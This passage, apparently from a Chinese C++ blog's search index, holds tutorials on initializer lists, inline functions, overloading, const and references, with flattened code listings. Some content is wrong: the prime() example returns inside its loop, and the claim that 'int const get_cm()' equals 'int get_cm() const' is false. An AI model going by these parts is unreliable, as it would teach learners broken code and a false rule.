_age;public: Teacher(int age) { _age = age; } int getAge() const { return _age; }};class Student {private : int _age; Teacher teacher;public: // 使用构造函数的初始化列表来初始化Teacher类对象 // 这里会自动调用Teacher类的有参构造函数，并将age2作为构造函数的参数传递过去 Student(int age1, int age2) : teacher(age2) { _age = age1; } int getAge() const { return _age; } Teacher getTeacher() { return teacher; }};int main() { Student s(20, 35); cout &lt;&lt; "student.age: " &lt;&lt; s.getAge() &lt;&lt; ", teacher.age: " &lt;&lt; s.getTeacher().getAge() &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1student.age: 20, teacher.age: 35 初始化列表使用的语法规则构造函数初始化列表以一个冒号开始，接着是以逗号分隔的数据成员列表，每个数据成员后面跟一个放在括号中的初始化式。 1234Constructor::Contructor() : m1(v1), m2(v1,v2), m3(v3){} 在下述的示例代码中，两个构造函数的最终效果是一样的。使用初始化列表的构造函数是显式地初始化类的成员；而没有使用初始化列表的构造函数是对类的成员赋值，并没有显式地初始化。 12345678910111213141516171819class A{public: int a; float b; A(): a(0),b(9.9) {} //构造函数初始化列表};class A{public: int a; float b; A() //构造函数内部赋值 { a = 0; b = 9.9; }}; 初始化 const 成员和引用成员构造函数初始化列表是初始化 const 成员和引用成员的唯一方式。因为 const 成员或引用类型的成员只能被初始化，不能对它们赋值。示例代码如下： 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;class A {private: int i; int &amp;j; const int c;public: // 构造函数初始化列表 A(int x, int y) : c(x), j(y) { i = -1; }};int main() { int m; A a(5, m); // C++编译可以通过 return 0;} 若不通过初始化列表来对 const 成员或引用类型的成员进行初始化，那么缺省情况下，在构造函数被执行之前，对象中的所有成员都已经被它们自己的默认无参构造函数初始化了。由于这两种数据成员要在声明后马上初始化，而在构造函数中，做的就是对它们赋值，这样是不被允许的。示例代码如下： 1234567891011121314151617181920212223#include &lt;iostream&gt;using namespace std;class A {private: int i; int &amp;j; const int c;public: A(int x) { i = -1; c = 5; // C++编译不通过，必须通过初始化列表来初始化 j = x; // C++编译不通过，必须通过初始化列表来初始化 }};int main() { A a(3); return 0;} 当类中某个数据成员本身也是一个类对象时，应该尽量避免使用赋值操作来对该成员进行初始化，示例代码如下： 1234567891011class Person{private: string name;public: Person(string &amp; n) { name = n; }} 虽然这样的构造函数也能得到正确的结果，但这样写效率并不高。当一个 Person 对象创建时，string 类成员对象 name 先会被默认无参构造函数进行初始化，然后在 Person 类的自定义有参构造函数中，它的值又会因赋值操作而再改变一次。这里可以通过初始化列表来显示地对 name 对象进行初始化，这样就可以将前面的两步骤（初始化和赋值）合并成一个步骤了。示例代码如下： 12345678910class Person{private: string name;public: Person(string&amp; n): name(n){ }} 初始化与赋值的区别重点知识点： 初始化：被初始化的对象正在创建 赋值：被赋值的对象已经存在 初始化列表优先于构造函数的执行 成员变量的初始化顺序与声明的顺序相关，与在初始化列表中的顺序无关 在宏观代码上，两者作用相同。对于数组和结构体来说，初始化和赋值的的形式不同。对于数组，可以使用花括号一起初始化，如果赋值的话，就只能单个元素就行；对于结构体，可以使用花括号初始化，否则只能通过 . 来访问变量进行赋值。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct MyStruct { int aa; float bb; string cc;};int main() { int a[3] = {1, 2, 3}; int b[3]; b[0] = 1; b[1] = 2; b[2] = 3; MyStruct stu1 = {1, 3.14f, "hello world"}; MyStruct stu2; stu2.aa = 1; stu2.bb = 3.14f; stu2.cc = "we are csdn"; cout &lt;&lt; stu1.aa &lt;&lt; endl; cout &lt;&lt; stu1.bb &lt;&lt; endl; cout &lt;&lt; stu1.cc &lt;&lt; endl; return 0;} 构造函数和析构函数的调用顺序 当类中有成员变量是其它类的对象时，首先调用成员变量的构造函数，调用顺序与声明顺序相同，之后再调用类自身的构造函数 析构函数的调用顺序与对应的构造函数调用顺序相反 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之三",url:"/posts/f26087ad.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 C++ 对 C 语言的函数扩展内联函数什么是内联函数在 C 语言中，使用宏定义函数这种借助编译器的优化技术来减少程序的执行时间，那么在 C++ 中有没有相同的技术或者更好的实现方法呢？答案是有的，那就是内联函数。内联函数作为编译器优化手段的一种技术，在降低程序运行时间上非常有用。C++ 的内联函数是通常与类一起使用。如果一个函数是内联的，那么在编译时，编译器会把该函数的代码副本放置在每个调用该函数的地方。对内联函数进行任何修改，都需要重新编译函数的所有客户端，因为编译器需要重新更换一次所有的代码，否则将会继续使用旧的函数。如果想把一个函数定义为内联函数，则需要在函数名前面放置关键字 inline，在调用函数之前需要对函数进行定义。所有在类中定义的函数都是内联函数，即使没有使用 inline 关键字声明。当内联函数收到编译器的指示时，即可发生内联：编译器将使用函数的定义体来替代函数调用语句，这种替代行为发生在编译阶段而非程序运行阶段。值得一提的是，内联函数仅仅是对编译器的内联建议，编译器是否觉得采取建议取决于函数是否符合内联的有利条件。如何函数体非常大，那么编译器将忽略函数的内联声明，而将内联函数作为普通函数处理。 为什么要使用内联函数有时候我们会写一些功能专一的函数，这些函数的函数体不大，包含了很少的执行语句。例如在计算 1~1000 以内的素数时，我们经常会使用开方操作使运算范围缩小，这时我们会写如下一个函数： 1234int root(int n){ return (int)sqrt((float)n);} 然后求范围内素数的函数可以这样写： 12345678910int prime(int n){ int i; for (i = 2; i &lt;= root(n); i++) { if (n%i == 0) return 0; return 1; }} 当然，把 root 函数放在循环中不是个不明智的选择，但想象一下，在某个程序上下文内必须频繁地调用某个类似 root 的函数，其调用函数的花销会有多大：当遇到普通函数的调用指令时，程序会保存当前函数的执行现场，将函数中的局部变量以及函数地址压入堆栈，然后再将即将调用的新函数加载到内存中，这要经历复制参数值、跳转到所调用函数的内存位置、执行函数代码、存储函数返回值等过程；当函数执行完后，再获取之前正在调用的函数的地址，回去继续执行那个函数，运行时间开销简直太多了。为了解决上述问题，C++ 内联函数提供了替代函数调用的方案，通过 inline 声明，编译器首先在函数调用处使用函数体本身语句替换了函数调用语句，然后编译替换后的代码。因此，通过内联函数，编译器不需要跳转到内存其他地址去执行函数调用，也不需要保留函数调用时的现场数据。 如何使用内联函数12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;// 宏定义函数的声明#define MAXFUNC(x, y) (x &gt; y) ? x : y// 内联函数的声明inline int Max(int x, int y) { return (x &gt; y) ? x : y;}int main() { // 内联函数的调用 cout &lt;&lt; "Max (20,10): " &lt;&lt; Max(20, 10) &lt;&lt; endl; cout &lt;&lt; "Max (0,200): " &lt;&lt; Max(0, 200) &lt;&lt; endl; cout &lt;&lt; "Max (100,1010): " &lt;&lt; Max(100, 1010) &lt;&lt; endl; // 宏定义函数的调用 printf("Max (10,30): %d\\n", MAXFUNC(10, 30)); return 0;} 程序运行的输出结果如下： 1234Max (20,10): 20Max (0,200): 200Max (100,1010): 1010Max (10,30): 30 内联函数的优缺点优点： 它通过避免函数调用所带来的开销来提高程序的运行速度 通过将函数声明为内联，则可以把函数定义放在头文件内 它避免了普通函数调用时的额外开销（压栈、弹栈、跳转、返回） 缺点： 因为代码的扩展，内联函数增大了可执行程序的体积 C++ 内联函数的展开是编译阶段，这就意味着如果内联函数发生了改动，那么就需要重新编译代码 当把内联函数放在头文件中时，它将会使头文件信息变多，不过头文件的使用者不用在意这些细节 有时候内联函数并不受到青睐，比如在嵌入式系统中，嵌入式系统的存储约束可能不允许体积很大的可执行程序运行 内联函数的编译限制C++ 中内联函数编译的限制： 函数体不能过于庞大 不能对函数进行取址操作 不能存在任何形式的循环语句 不能存在过多的条件判断语句 函数的内联声明必须在调用语句之前 编译器对于内联函数的限制并不是绝对的，内联函数相对于普通函数的优势只是省去了函数调用时压栈、弹栈、跳转和返回的开销。因此，当函数体的执行开销远大于压栈、弹栈、跳转和返回所用的开销时，那么内联将变得毫无意义。 什么时候该使用内联函数当程序设计需要时，每个函数都可以声明为 inline，下面列举一些有用的建议： 当对程序执行性能有要求时，那么就可以使用内联函数 当想使用宏定义一个函数时，那就果断使用内联函数来替代 在类内部定义的函数会默认声明为 inline 函数，这有利于类实现细节的隐藏 关键点： 虚函数不允许内联 所有在类中定义的函数都默认声明为 inline 函数，所有不用再显示地去声明 inline 虽然说模板函数放中头文件中，但它们不一定是内联的（不是说定义在头文件中的函数都是内联函数） C++ 编译器会直接将编译后的内联函数体插入到调用的地方，内联函数在最终生成的代码中是没有定义的 内联函数由编译器处理，直接将编译后的内联函数体插入到调用的地方；而宏定义由预处理器处理，只进行简单的文本替换，没有任何编译过程 一些现代的 C++ 编译器提供了扩展语法，能够对函数进行强制内联，例如： g++ 中的 __attribute__((always_inline)) 属性 编译器的内联看起来就像是代码的复制与粘贴，但这与预处理宏是很不同的；宏定义函数是强制的内联展开，可能将会污染所有的命名空间与代码，会为程序的调试带来困难 内联声明只是一种对编译器的建议，编译器是否采用内联措施由编译器自己来决定。现代 C++ 编译器能够进行编译优化，甚至在汇编阶段或链接阶段，一些没有 inline 声明的函数，也可能被编译器内联编译 函数默认参数C++ 中可以在函数声明时为参数提供一个默认值，当函数调用时没有指定这个参数的值，编译器会自动用默认值代替。函数默认参数的使用规则如下： 只有参数列表后面部分的参数才可以提供默认参数值 一旦在一个函数调用中开始使用默认参数值，那么这个参数后的所有参数都必须使用默认参数值 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;void funcA(int x = 3) { printf("x: %d\\n", x);}void funcB(int a, int b, int y = 4, int z = 5) { printf("a: %d, b: %d, y: %d, z: %d\\n", a, b, y, z);}int main() { funcA(); funcA(6); funcB(1, 2); funcB(1, 2, 3, 4); return 0;} 程序运行的输出结果如下： 1234x: 3x: 6a: 1, b: 2, y: 4, z: 5a: 1, b: 2, y: 3, z: 4 函数占位参数函数占位参数只有参数类型声明，而没有参数名声明；一般情况下，在函数体内部无法使用占位参数。 123456789101112#include &lt;iostream&gt;using namespace std;int func(int a, int b, int) { return a + b;}int main() { printf("func(1, 2, 3) = %d\\n", func(1, 2, 3)); return 0;} 程序运行的输出结果如下： 1func(1, 2, 3) = 3 函数默认参数结合函数占位参数 可以将函数默认参数与函数占位参数结合起来使用，其意义在于为以后程序的扩展留下空间，并兼容 C 语言代码中可能出现的不规范写法。 12345678910111213#include &lt;iostream&gt;using namespace std;void func(int a, int b, int = 0) { printf("a + b = %d\\n", a + b);}int main() { func(1, 2); func(1, 2, 3); return 0;} 程序运行的输出结果如下： 12a + b = 3a + b = 3 函数重载函数重载的概念函数重载概念（Function Overload）： 用同一个函数名定义不同的函数 当函数名和不同的参数搭配时函数的含义不同 函数重载至少满足下面的一个条件（函数重载的判断标准）： 参数个数不同 参数类型不同 参数顺序不同 特别注意： 函数的返回值不是函数重载的判断标准 函数重载的使用12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int func(int x) { return x;}int func(int a, int b) { return a + b;}int func(const char *s) { return strlen(s);}int main() { int c = 0; c = func(1); printf("c = %d\\n", c); c = func(1, 2); printf("c = %d\\n", c); c = func("12345"); printf("c = %d\\n", c); return 0;} 程序运行的输出结果如下： 123c = 1c = 3c = 5 函数重载的调用准则编译器调用重载函数的准则： 将所有同名函数作为候选者 尝试寻找可行的候选函数 精确匹配实参 通过默认参数能够匹配实参 通过默认类型转换匹配实参 匹配失败 最终寻找到的可行候选函数不唯一，则出现二义性，编译失败 无法匹配所有候选者，函数未定义，编译失败 函数重载的注意事项： 重载函数的函数类型是不同的 函数重载是发生在一个类中里面的 函数的返回值不能作为函数重载的依据 函数重载是由函数名和参数列表决定的 重载函数在本质上是相互独立的不同函数 函数重载与函数指针当使用重载函数名对函数指针进行赋值时： 根据重载规则挑选与函数指针参数列表一致的候选者 严格匹配候选者的函数类型与函数指针的函数类型 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int func(int x) { return x;}int func(int a, int b) { return a + b;}int func(const char *s) { return strlen(s);}// 第一种写法：声明函数类型typedef int (FUNC)(int a);// 第二种写法：声明函数指针类型typedef int(*PFUNC)(int a, int b);int main() { // 根据上面的第一种写法，定义函数指针类型的变量 FUNC *FUNC = func; int c = FUNC(1); printf("c = %d\\n", c); // 根据上面的第二种写法，定义函数指针类型的变量 PFUNC p = func; int d = p(3, 4); printf("d = %d\\n", d); return 0;} 程序运行的输出结果如下： 12c = 1d = 7 函数重载与函数默认参数当函数重载遇上函数默认参数时，如果代码存在二义性，那么 C++ 编译器会编译失败，示例代码如下： 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int func(int a, int b, int c = 0) { return a * b * c;}int func(int a, int b) { return a + b;}int func(int a) { return a;}int main() { int c = 0; // c = func(1, 2); // 存在二义性，调用失败，编译不能通过 printf("c = %d\\n", c); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之二",url:"/posts/b03c11a0.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 const 关键字const 简介const 是 constant 的缩写，本意是不变的，不易改变的意思。在 C++ 中是用来修饰内置类型变量、自定义对象、成员函数、返回值、函数参数。C++ 的 const 关键字允许指定一个语义约束，编译器会强制实施这个约束，允许程序员告诉编译器某值是保持不变的。如果在编程中确实有某个值保持不变，就应该明确使用 const，这样可以获得编译器的帮助。 1234567891011#include &lt;iostream&gt;using namespace std;int main() { const int a = 7; int *p = (int *) &amp;a; *p = 8; cout &lt;&lt; a &lt;&lt; " "&lt;&lt; *p; return 0;} 在上述代码中，对于 const 变量 a，我们取变量的地址并转换赋值给 指向 int 的指针，然后利用 *p = 8; 重新赋值，然后输出查看 a 的值，程序运行的输出结果如下： 17 8 从结果中可以看到，编译器认为 a 的值为一开始定义的 7，所以对 const a 的操作就会产生上面的情况。所以千万不要轻易对 const 变量赋值，这会产生意想不到的行为。C++ 编译器对 const 常量的处理机制是，当碰见常量声明时，往符号表中放入常量；在编译过程中若发现使用常量，则直接以符号表中的值替换，例如在编译过程中若发现对 const 常量使用了 extern 或者 &amp; 操作符，则会给对应的常量单独分配内存空间（兼容 C 语言），这也是上述代码中打印 *p 的值为 8 的原因，点击查看原理分析图。 如果不想让编译器察觉到上面对 const 变量的操作，我们可以在 const 前面加上 volatile 关键字。volatile 关键字跟 const 刚好相反，是易变的，容易改变的意思；所以不会被编译器优化，编译器也就不会改变对 a 变量的操作。 1234567891011#include&lt;iostream&gt;using namespace std;int main() { volatile const int a = 7; int *p = (int *) &amp;a; *p = 8; cout &lt;&lt; a &lt;&lt; " " &lt;&lt; *p; return 0;} 程序运行的输出结果如下： 18 8 const 参数传递对于 const 修饰函数参数可以分为三种情况： A：值传递的 const 修饰传递，一般这种情况不需要 const 修饰，因为函数会自动产生临时变量复制实参值。 123456789101112131415#include &lt;iostream&gt;using namespace std;void Cpf(const int a){ cout &lt;&lt; a; // ++a; 是错误写法，a 不能被改变}int main(){ Cpf(8); return 0;} B：当 const 参数为指针时，可以防止指针被意外篡改。 123456789101112131415#include &lt;iostream&gt;using namespace std;void Cpf(int *const a) { cout &lt;&lt; *a &lt;&lt; endl; // a 为 8 *a = 9;}int main() { int a = 8; Cpf(&amp;a); cout &lt;&lt; a &lt;&lt; endl; // a 为 9 return 0;} C：自定义类型的参数传递，需要使用临时对象复制参数，对于临时对象的构造，需要调用拷贝构造函数，比较浪费资源，因此可以采取 const 外加引用传递的方式。并且对于一般的 int、double 等内置类型，不需要采用引用的传递方式。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); return 0;} 程序运行的输出结果如下： 18 const 函数返回值对于 const 修饰函数的返回值可以分三种情况： A：const 修饰内置类型（如 int、double）的返回值，修饰与不修饰返回值的作用都一样。 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;const int Cmf() { return 1;}int Cpf() { return 0;}int main() { int _m = Cmf(); int _n = Cpf(); cout &lt;&lt; _m &lt;&lt; " " &lt;&lt; _n; // 输出结果为：1 0 return 0;} B：const 修饰自定义类型的作为返回值，此时返回的值不能作为左值使用，既不能被赋值，也不能被修改。 C：const 修饰返回的指针或者引用，是否返回一个指向 const 的指针，取决于我们想让用户干什么。 const 修饰指针变量const 修饰指针变量有以下三种情况： A： const 修饰指针指向的内容，则内容为不可变量。 B： const 修饰指针，则指针为不可变量。 C： const 修饰指针和指针指向的内容，则指针和指针指向的内容都为不可变量。 对于 A，则指针指向的内容不可改变，简称左定值，因为 const 位于 * 号的左边。 12345int a = 10;int b = 20;const int *p = &amp;a;p = &amp;b; // 正确写法*p = 10; //错误写法 对于 B， const 指针 p 其指向的内存地址不能够被改变，但其内容可以改变。简称右定向，因为 const 位于 * 号的右边。 12345int a = 8;int * const p = &amp;a;*p = 9; // 正确写法int b = 7;p = &amp;b; // 错误写法 对于 C，则是 A 和 B 合并的结果，即 const p 指向的内容和指向的内存地址都已固定，不可改变。 12int a = 8;const int * const p = &amp;a; 对于 A、B、C 三种情况，根据 const 位于 * 号的位置不同，可以总结三句便于记忆的话： 左定值，右定向，const 修饰不变量。 const 修饰类成员函数const 修饰类成员函数，其目的是防止成员函数修改被调用对象的值，如果我们不想修改一个调用对象的值，所有的成员函数都应当声明为 const 成员函数，此时 const 本质上修饰的是 this 指针。值得一提的是，const 关键字不能与 static 关键字同时使用，因为 static 关键字修饰静态成员函数，而静态成员函数不含有 this 指针，即不能实例化，但 const 成员函数必须关联某一对象实例。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { // _cm = 10; 是错误写法，对象的_cm属性值不能被改变 return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); return 0;} 程序运行的输出结果如下： 18 上面的 int get_cm() const {} 函数用到了 const 成员函数，如果 int get_cm() {} 去掉 const 修饰，则 Cmf 函数传递的 const _tt 即使没有改变对象的值，编译器也认为函数 int get_cm() {} 会改变对象的值，所以我们尽量按照要求将所有的不需要改变对象内容的函数都作为 const 成员函数。下述两种的写法都是合法的，效果都一样，C++ 中一般将 const 写在函数的末尾处。 123456int get_cm() const {}int const get_cm() {} 如果有个成员函数想修改对象中的某一个成员怎么办？这时我们可以使用 mutable 关键字修饰这个成员，mutable 的意思也是易变的，容易改变的意思，被 mutable 关键字修饰的成员可以处于不断变化中，如下面的例子： 123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;class Test {public: int _cm; mutable int _ct;public: Test(int _m, int _t) : _cm(_m), _ct(_t) {} void Kf() const { // ++_cm; 错误写法 ++_ct; // 正确写法 }};int main() { Test t(8, 7); t.Kf(); cout &lt;&lt; t._cm &lt;&lt; " " &lt;&lt; t._ct &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 18 8 这里在函数 void Kf() const {} 中可以通过 ++_ct; 修改 _ct 的值，但是通过 ++_cm 修改 _cm 则会报错，因为 _cm 没有用 mutable 修饰。 const 和 #define 的区别C++ 中不但可以用 #define 定义常量还可以用 const 定义常量，例如 const int c = 5; ≈ #define c 5，它们的区别如下： 用 #define MAX 255 定义的常量是没有类型的，所给出的是一个立即数，编译器只是把所定义的常量值与所定义的常量的名字联系起来，#define 所定义的宏变量在编译器执行预处理的时候进行替换，在程序中使用到该常量的地方都要进行拷贝替换 用 const float MAX = 255; 定义的常量有类型名字，存放在内存的静态区域中，在程序运行过程中 const 变量只有一个拷贝，而 #define 所定义的宏变量却有多个拷贝，所以宏定义在程序运行过程中所消耗的内存要比 const 变量的大得多 用 #define 定义的常量是不可以用指针变量去指向的，用 const 定义的常量是可以用指针去指向该常量的地址 用 #define 可以定义一些简单的函数，const 是不可以定义函数 编译器处理方式： #define – 在编译器的预处理阶段进行单纯的文本替换 const – 在编译器的编译阶段确定其值 类型检查： #define – 无类型，不进行类型安全检查，可能会产生意想不到的错误 const – 有数据类型，编译时会进行类型与作用域检查 内存空间： #define – 不分配内存，给出的是立即数，有多少次使用就进行多少次替换，在内存中会有多个拷贝，消耗内存大 const – 在静态存储区中分配空间，在程序运行过程中内存中只有一个拷贝 其他方面： 在编译时，编译器通常不为 const 常量分配内存空间，而是将它们保存在符号表中，这使得它成为一个编译期间的常量，没有了存储与读内存的操作，使得它的效率也很高。#define 宏替换只作替换，不做计算，不做表达式求解 宏定义的作用范围仅限于当前文件，默认状态下，const 常量只在文件内有效，当多个文件中出现了同名的 const 常量时，等同于在不同文件中分别定义了独立的常量。如果想在多个文件之间共享 const 常量，必须在常量定义之前添加 extern 关键字（在声明和定义时都要添加） C 语言与 C++ 的 const 对比C 语言的 const 变量： C 语言中 const 变量是只读变量，有自己的内存空间 C 语言中，可以通过操作指针的方式来修改 const 变量的值 C++ 的 const 常量： 可能分配内存空间，也可能不分配内存空间 当使用 &amp; 操作符取 const 常量的地址时，会分配内存空间 当 const 常量为全局，并且需要在其它文件中使用，会分配内存空间 当 const int &amp;a = 10;，即 const 修饰引用时，也会分配内存空间 注意：C++ 编译器虽然可能为 const 常量分配内存空间，但不会使用其内存空间中的值，同时是在编译器的编译阶段分配内存空间 引用（普通引用）变量名回顾 变量名实质上是一段连续内存空间的别名，是一个标号（门牌号） 程序中通过变量来申请并命名内存空间 通过变量的名称可以使用内存空间 引用的概念在 C++ 中新增加了引用的概念： a) 引用可以看作一个已定义变量的别名 b) 引用的语法：Type &amp; name = var; c) 引用作为函数参数声明时，不会进行初始化 d) 普通引用在声明时必须用其它的变量进行初始化 123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main() {{ int a = 10; // 编译器分配4个字节的内存空间，a是内存空间的别名 int &amp;b = a; // b就是a的别名，即b引用了a a =11; // 直接赋值 { int *p = &amp;a; *p = 12; printf("a %d \\n",a); } b = 14; printf("a:%d b:%d", a, b); return 0;} 程序运行的输出结果如下： 12a 12a:14 b:14 引用是 C++ 的概念引用属于 C++ 编译器对 C 语言的扩展，下述代码在 C 语言中不能通过编译，这里不要用 C 语言的语法去思考 b = 11。 123456int main() { int a = 0; int &amp;b = a; b = 11; return 0;} 引用作函数参数 普通引用在声明时必须用其它的变量进行初始化，int &amp;a; 这样的写法是错误的（在结构体内声明除外） 引用作为函数参数声明时，不会进行初始化 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;struct Teacher { char name[64]; int age;};// pT是指向t1的指针，这里相当于修改了t1void printfT(Teacher *pT) { cout &lt;&lt; pT-&gt;age &lt;&lt; endl; pT-&gt;age = 23;}// pT是t1的别名，这里相当于修改了t1void printfT2(Teacher &amp; pT) { cout &lt;&lt; pT.age &lt;&lt; endl; pT.age = 33;}// pT和t1的是两个不同的变量，这里只会修改pT变量，不会修改t1变量void printfT3(Teacher pT) { cout &lt;&lt; pT.age &lt;&lt; endl; pT.age = 43;}int main() { Teacher t1; t1.age = 35; // pT是指向t1的指针 printfT(&amp;t1); printf("t1.age:%d \\n", t1.age); // pT是t1的别名 printfT2(t1); printf("t1.age:%d \\n", t1.age); // pT是形参，相当于t1复制一份数据给pT ---&gt; pT = t1 printfT3(t1); printf("t1.age:%d \\n", t1.age); return 0;} 程序运行输出的结果如下： 12345635t1.age:2323t1.age:3333t1.age:33 引用的使用意义 引用作为其它变量的别名而存在，因此在一些场合可以代替指针 引用相对于指针来说，具有更好的可读性和实用性 使用引用和指针，分别实现交换两个数字的 C++ 代码如下： 引用的本质分析 1）引用在 C++ 中的内部实现是一个常指针，Type &amp; name --&gt; Type * const name 2）C++ 编译器在编译过程中，使用常指针作为引用的内部实现，因此引用所占用的内存空间大小与指针相同 3）从使用的角度看，引用会让人误会其只是一个别名，没有自己的内存空间，这是 C++ 为了实用性而做出的细节隐藏 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;void func(int &amp;a) { a = 10;}void func(int *const a) { *a = 15;}int main() { int x = 5; func(x); cout &lt;&lt; x &lt;&lt; endl; // 10 func(&amp;x); cout &lt;&lt; x &lt;&lt; endl; // 15 return 0;} 参考上述代码，函数参数间接赋值（指针方式）成立的三个条件如下： a) 定义两个变量（一个实参一个形参） b) 建立关联，实参取地址传给形参 c) 使用 *a 形参去间接的修改实参的值 引用在实现上，只不过是把间接赋值成立的三个条件的后两步和二为一；当实参传给形参引用的时候，是 C++ 编译器帮程序员自动取了一个实参地址传给了形参引用（常量指针）。当我们使用引用语法的时，不需要关心编译器引用是怎么做的；当我们分析奇怪的语法现象时，我们才去考虑 C++ 编译器是怎么做的。 函数返回值是引用当函数返回值为引用时： 若函数返回的是栈变量（如作用域只在函数体内的变量），不能成为其它引用的初始值，不能作为左值使用 若函数返回的是静态变量或全局变量，可以成为其他引用的初始值，即可作为右值使用，也可作为左值使用 函数返回值是基础类型当引用12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int getAA1() { int a; a = 10; return a;}int &amp; getAA2() { int a; a = 10; return a;}int * getAA3() { int a; a = 10; return &amp;a;}int main() { int a1 = getAA1(); int a2 = getAA2(); int &amp;a3 = getAA2(); int *a4 = getAA3(); cout &lt;&lt; "a1 = " &lt;&lt; a1 &lt;&lt; endl; cout &lt;&lt; "a2 = " &lt;&lt; a2 &lt;&lt; endl; cout &lt;&lt; "a3 = " &lt;&lt; a3 &lt;&lt; endl; // 这里用引用去接受函数的返回值，结果是不是乱码，关键是看返回的内存空间是不是被编译器回收了 cout &lt;&lt; "a4 = " &lt;&lt; *a4 &lt;&lt; endl; // 这里用引用去接受函数的返回值，结果是不是乱码，关键是看返回的内存空间是不是被编译器回收了 return 0;} 程序运行输出的结果如下： 1234a1 = 10a2 = 10a3 = 10 或者 a3 = 乱码a4 = 10 或者 a4 = 乱码 函数返回值是 static 变量当引用值得一提的是，static 关键字修饰变量的时候，变量是一个状态变量。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;int j() { static int a = 10; a++; printf("a:%d \\n", a); return a;}int &amp; j1() { static int a = 10; a++; printf("a:%d \\n", a); return a;}int * j2() { static int a = 15; a++; printf("a:%d \\n", a); return &amp;a;}int main() { // 错误写法，j()的运算结果是一个数值，没有内存地址，不能当左值，类似 11 = 100; // j() = 3; //当被调用的函数当左值的时候，必须返回一个引用 j1() = 100; j1(); *(j2()) = 200; j2(); return 0;} 程序运行输出的结果如下： 1234a:11a:101a:16a:201 函数返回值是形参当引用12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int g1(int *p) { *p = 100; return *p;}int &amp; g2(int *p) { *p = 100; return *p;}int main() { int a1 = 10; a1 = g2(&amp;a1); int &amp;a2 = g2(&amp;a1); printf("a1:%d \\n", a1); printf("a2:%d \\n", a2); return 0;} 程序运行输出的结果如下： 12a1:100a2:100 函数返回值是非基础类型如果函数返回的引用不是基础类型，而是一个类，那么此时的情况非常复杂，涉及到 copy 构造函数和 = 操作重载的知识内容，这里暂时不展开讨论。 123456789101112#include &lt;iostream&gt;using namespace std;struct Teachar { char name[64]; int age;};struct Teachar &amp; OpTeacher(struct Teachar &amp;t1) {} 指针引用12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;struct Teacher { char name[64]; int age;};// 二级指针作函数参数int getTe(Teacher **myp) { Teacher *p = (Teacher *) malloc(sizeof(Teacher)); if (p == NULL) { return -1; } memset(p, 0, sizeof(Teacher)); p-&gt;age = 33; *myp = p; return 0;}// 指针引用作函数参数int getTe2(Teacher *&amp;myp) { myp = (Teacher *) malloc(sizeof(Teacher)); if (myp == NULL) { return -1; } myp-&gt;age = 34; return 0;}int main() { Teacher *p = NULL; getTe(&amp;p); printf("age:%d \\n", p-&gt;age); Teacher *pp = NULL; getTe2(pp); printf("age:%d \\n", pp-&gt;age); return 0;} 程序运行输出的结果如下： 12age:33age:34 常引用使用变量初始化 const 引用在 C++ 中可以声明 const 引用，例如 const Type &amp; name = var;，其中的 const 引用让变量拥有只读属性。 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;int main() { int a = 10; const int &amp;b = a; // b = 11; 